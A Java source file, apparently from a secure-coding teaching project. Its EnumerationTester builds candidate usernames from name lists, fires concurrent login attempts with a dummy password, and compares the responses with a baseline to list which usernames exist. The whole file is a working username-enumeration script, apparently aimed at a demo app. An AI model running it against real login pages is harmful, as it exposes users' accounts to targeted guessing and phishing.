/*
 * Copyright 2015-2018 Josh Cummings
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.joshcummings.codeplay.tools;

import com.joshcummings.codeplay.terracotta.testng.HttpSupport;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.AbstractMap;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.stream.Collectors;
import java.util.stream.Stream;

import static org.apache.http.client.methods.RequestBuilder.post;

public class EnumerationTester {
	private static HttpSupport http = new HttpSupport();

	private static MultiValueMap<String, String> usernamesByResponseType = new LinkedMultiValueMap<>();

	private static Map.Entry<String, String> attemptLogin(String username) {
		String content = http.postForContent(
				post("/login")
						.addParameter("username", username)
						.addParameter("password", "oi12bu34ci 123h 4dp2i3h4 234jn"));

		return new AbstractMap.SimpleImmutableEntry<>(content, username);
	}

	private static Stream<String> readAllLines(String filename) {
		InputStream is = EnumerationTester.class.getClassLoader().getResourceAsStream(filename);
		BufferedReader br = new BufferedReader(new InputStreamReader(is));
		return br.lines();
	}

	public static void main(String[] args) throws Exception {
		String dummyUsernameResponse = attemptLogin(UUID.randomUUID().toString()).getKey();

		ExecutorService executors = Executors.newFixedThreadPool(4);
		List<Future<Map.Entry<String, String>>> futures = new ArrayList<>();

		Set<String> usernamesToTest = new HashSet<>();

		Set<String> firstNames =
				readAllLines("first-names.csv")
						.flatMap((firstName) -> Stream.of(firstName.split(",")))
						.collect(Collectors.toSet());

		firstNames.stream()
				.forEach((firstName) -> {
							readAllLines("last-names.csv")
									.forEach((lastName) -> {
										usernamesToTest.add(firstName.toLowerCase());
										usernamesToTest.add(firstName.toLowerCase().substring(0, 1) + lastName.toLowerCase());
										usernamesToTest.add(firstName.toLowerCase() + "." + lastName.toLowerCase());
									});
						}
				);

		System.out.println("Will test " + usernamesToTest.size() + " usernames");

		for (String username : usernamesToTest) {
			futures.add(executors.submit(() -> attemptLogin(username)));
		}

		for (Future<Map.Entry<String, String>> f : futures) {
			Map.Entry<String, String> ret = f.get();
			usernamesByResponseType.add(ret.getKey(), ret.getValue());
		}

		usernamesByResponseType.remove(dummyUsernameResponse);
		System.out.println("These appear to be legit usernames " + usernamesByResponseType.values());
	}
}